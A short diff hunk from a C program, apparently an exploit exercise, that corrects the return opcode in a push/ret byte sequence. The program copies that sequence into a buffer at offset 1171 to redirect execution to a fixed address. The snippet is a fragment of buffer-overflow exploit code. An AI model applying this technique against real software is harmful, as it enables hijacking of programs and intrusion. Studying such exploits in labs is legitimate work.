@@ -29,7 +29,7 @@ int main() {
 
     // tricky jump
     char * jump = "\x68\x4e\x84\x04\x08" // push 0x0804844e
-                  "\xc6"; // ret
+                  "\xc3"; // ret
     for (int i = 0; i < 6; i++) {
         buffer[1171 + i] = jump[i];
     }
